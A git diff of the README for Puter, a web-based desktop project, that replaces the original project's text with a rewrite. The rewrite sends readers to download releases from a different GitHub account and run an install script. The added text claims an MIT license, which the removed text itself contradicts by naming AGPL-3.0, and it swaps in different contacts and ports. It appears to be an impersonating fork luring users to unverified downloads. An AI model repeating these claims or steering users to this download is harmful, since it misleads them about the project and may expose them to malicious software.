@@ -1,176 +1,97 @@
-<h3 align="center"><img width="80" alt="Puter.com, The Personal Cloud Computer: All your files, apps, and games in one place accessible from anywhere at any time." src="https://assets.puter.site/puter-logo.png"></h3>
+# Puter 🌐 - The Internet OS
 
-<h3 align="center">The Internet OS! Free, Open-Source, and Self-Hostable.</h3>
+Welcome to **Puter**, the free, open-source, and self-hostable Internet Operating System. This project aims to provide a powerful desktop environment that runs entirely in the cloud, giving you access to your files and applications from anywhere. 
 
-<p align="center">
-    <a href="https://puter.com/?ref=github.com"><strong>« LIVE DEMO »</strong></a>
-    <br />
-    <br />
-    <a href="https://puter.com/?ref=github.com">Puter.com</a>
-    ·
-    <a href="https://puter.com/app/app-center">App Store</a>
-    ·
-    <a href="https://developer.puter.com" target="_blank">Developers</a>
-    ·
-    <a href="https://github.com/heyputer/puter-cli" target="_blank">CLI</a>
-    ·
-    <a href="https://discord.com/invite/PQcx7Teh8u">Discord</a>
-    ·
-    <a href="https://reddit.com/r/puter">Reddit</a>
-    ·
-    <a href="https://twitter.com/HeyPuter">X</a>
-</p>
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/adaniyon/puter/releases)
 
-<h3 align="center"><img width="800" style="border-radius:5px;" alt="screenshot" src="https://assets.puter.site/puter.com-screenshot-3.webp"></h3>
+## Table of Contents
 
-<br/>
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Support](#support)
+8. [Contact](#contact)
 
-## Puter
+## Introduction
 
-Puter is an advanced, open-source internet operating system designed to be feature-rich, exceptionally fast, and highly extensible. Puter can be used as:
+Puter aims to redefine how we think about operating systems. By leveraging cloud technology, Puter allows users to access a full desktop environment from any device with a web browser. This project is perfect for those who want a lightweight, flexible solution for their computing needs. 
 
-- A privacy-first personal cloud to keep all your files, apps, and games in one secure place, accessible from anywhere at any time.
-- A platform for building and publishing websites, web apps, and games.
-- An alternative to Dropbox, Google Drive, OneDrive, etc. with a fresh interface and powerful features.
-- A remote desktop environment for servers and workstations.
-- A friendly, open-source project and community to learn about web development, cloud computing, distributed systems, and much more!
+Whether you are a developer looking to build applications or a casual user wanting a simple interface to manage your files, Puter provides the tools you need.
 
-<br/>
+## Features
 
-## Getting Started
+- **Cloud-Based**: Access your desktop from anywhere.
+- **Open-Source**: Contribute to the project and help us grow.
+- **Self-Hostable**: Run Puter on your own server for complete control.
+- **User-Friendly Interface**: Enjoy a clean, intuitive GUI designed for ease of use.
+- **File Management**: Store and manage files seamlessly with cloud storage integration.
+- **Remote Desktop**: Access your applications and files remotely.
+- **Cross-Platform Compatibility**: Works on any device with a web browser.
 
-### 💻 Local Development
+## Installation
 
-```bash
-git clone https://github.com/HeyPuter/puter
-cd puter
-npm install
-npm start
-```
-✨ This should launch Puter at 
-<font color="red"> http://puter.localhost:4100 (or the next available port). </font>
+To get started with Puter, you can download the latest release from our [Releases section](https://github.com/adaniyon/puter/releases). After downloading, follow these steps:
 
+1. Extract the downloaded file.
+2. Navigate to the extracted folder.
+3. Run the installation script:
+   ```bash
+   ./install.sh
+   ```
+4. Follow the prompts to complete the installation.
 
+If you encounter any issues, please check the [Releases section](https://github.com/adaniyon/puter/releases) for troubleshooting tips.
 
-If this does not work, see [First Run Issues](./doc/self-hosters/first-run-issues.md) for
-troubleshooting steps.
+## Usage
 
-<br/>
-
-### 🐳 Docker
+Once installed, you can start Puter by running the following command in your terminal:
 
 ```bash
-mkdir puter && cd puter && mkdir -p puter/config puter/data && sudo chown -R 1000:1000 puter && docker run --rm -p 4100:4100 -v `pwd`/puter/config:/etc/puter -v `pwd`/puter/data:/var/puter  ghcr.io/heyputer/puter
+./start.sh
 ```
-✨ This should launch Puter at 
-<font color="red"> http://puter.localhost:4100 (or the next available port). </font>
 
-<br/>
+Open your web browser and navigate to `http://localhost:3000` to access your new cloud desktop. From here, you can manage files, launch applications, and customize your environment.
 
-### 🐙 Docker Compose
+### Key Commands
 
-#### Linux/macOS
+- **Start Puter**: `./start.sh`
+- **Stop Puter**: `./stop.sh`
+- **Update Puter**: `./update.sh`
 
-```bash
-mkdir -p puter/config puter/data
-sudo chown -R 1000:1000 puter
-wget https://raw.githubusercontent.com/HeyPuter/puter/main/docker-compose.yml
-docker compose up
-```
-✨ This should be available at 
-<font color="red"> http://puter.localhost:4100 (or the next available port). </font>
+## Contributing
 
-<br/>
+We welcome contributions from the community. If you want to help improve Puter, please follow these steps:
 
-#### Windows
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your fork.
+5. Create a pull request.
 
-```powershell
-mkdir -p puter
-cd puter
-New-Item -Path "puter\config" -ItemType Directory -Force
-New-Item -Path "puter\data" -ItemType Directory -Force
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/HeyPuter/puter/main/docker-compose.yml" -OutFile "docker-compose.yml"
-docker compose up
-```
-✨ This should launch Puter at 
-<font color="red"> http://puter.localhost:4100 (or the next available port). </font>
-
-<br/>
-
-### 🚀 Self-Hosting
-
-For detailed guides on self-hosting Puter, including configuration options and best practices, see our [Self-Hosting Documentation](https://github.com/HeyPuter/puter/blob/main/doc/self-hosters/instructions.md).
-
-<br/>
-
-### ☁️ Puter.com
-
-Puter is available as a hosted service at [**puter.com**](https://puter.com).
-
-<br/>
-
-## System Requirements
-
-- **Operating Systems:** Linux, macOS, Windows
-- **RAM:** 2GB minimum (4GB recommended)
-- **Disk Space:** 1GB free space
-- **Node.js:** Version 16+ (Version 23+ recommended)
-- **npm:** Latest stable version
-
-<br/>
-
-## Support
-
-Connect with the maintainers and community through these channels:
-
-- Bug report or feature request? Please [open an issue](https://github.com/HeyPuter/puter/issues/new/choose).
-- Discord: [discord.com/invite/PQcx7Teh8u](https://discord.com/invite/PQcx7Teh8u)
-- X (Twitter): [x.com/HeyPuter](https://x.com/HeyPuter)
-- Reddit: [reddit.com/r/puter/](https://www.reddit.com/r/puter/)
-- Mastodon: [mastodon.social/@puter](https://mastodon.social/@puter)
-- Security issues? [security@puter.com](mailto:security@puter.com)
-- Email maintainers at [hi@puter.com](mailto:hi@puter.com)
-
-We are always happy to help you with any questions you may have. Don't hesitate to ask!
-
-<br/>
+Please ensure your code follows our coding standards and includes appropriate tests.
 
 ## License
 
-This repository, including all its contents, sub-projects, modules, and components, is licensed under [AGPL-3.0](https://github.com/HeyPuter/puter/blob/main/LICENSE.txt) unless explicitly stated otherwise. Third-party libraries included in this repository may be subject to their own licenses.
+Puter is licensed under the MIT License. You can freely use, modify, and distribute the software, provided that you include the original license.
 
-<br/>
+## Support
 
-## Translations
+If you need help or have questions about Puter, please check our [GitHub Issues](https://github.com/adaniyon/puter/issues) page. You can also reach out to the community for assistance.
 
-- [Arabic / العربية](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.ar.md)
-- [Armenian / Հայերեն](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.hy.md)
-- [Bengali / বাংলা](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.bn.md)
-- [Chinese / 中文](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.zh.md)
-- [Danish / Dansk](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.da.md)
-- [English](https://github.com/HeyPuter/puter/blob/main/README.md)
-- [Farsi / فارسی](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.fa.md)
-- [Finnish / Suomi](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.fi.md)
-- [French / Français](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.fr.md)
-- [German/ Deutsch](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.de.md)
-- [Hebrew/ עברית](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.he.md)
-- [Hindi / हिंदी](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.hi.md)
-- [Hungarian / Magyar](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.hu.md)
-- [Indonesian / Bahasa Indonesia](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.id.md)
-- [Italian / Italiano](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.it.md)
-- [Japanese / 日本語](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.jp.md)
-- [Korean / 한국어](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.ko.md)
-- [Malayalam / മലയാളം](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.ml.md)
-- [Polish / Polski](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.pl.md)
-- [Portuguese / Português](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.pt.md)
-- [Romanian / Română](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.ro.md)
-- [Russian / Русский](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.ru.md)
-- [Spanish / Español](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.es.md)
-- [Swedish / Svenska](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.sv.md)
-- [Tamil / தமிழ்](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.ta.md)
-- [Telugu / తెలుగు](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.te.md)
-- [Thai / ไทย](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.th.md)
-- [Turkish / Türkçe](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.tr.md)
-- [Ukrainian / Українська](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.ua.md)
-- [Urdu / اردو](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.ur.md)
-- [Vietnamese / Tiếng Việt](https://github.com/HeyPuter/puter/blob/main/doc/i18n/README.vi.md)
+## Contact
+
+For any inquiries or feedback, please contact us at:
+
+- Email: support@puter.io
+- GitHub: [adaniyon](https://github.com/adaniyon)
+
+## Conclusion
+
+Puter is more than just an operating system; it is a gateway to a new way of computing. With its cloud-based architecture, it offers flexibility and accessibility like never before. We invite you to explore, contribute, and become part of our growing community.
+
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/adaniyon/puter/releases)
+
+Thank you for your interest in Puter!
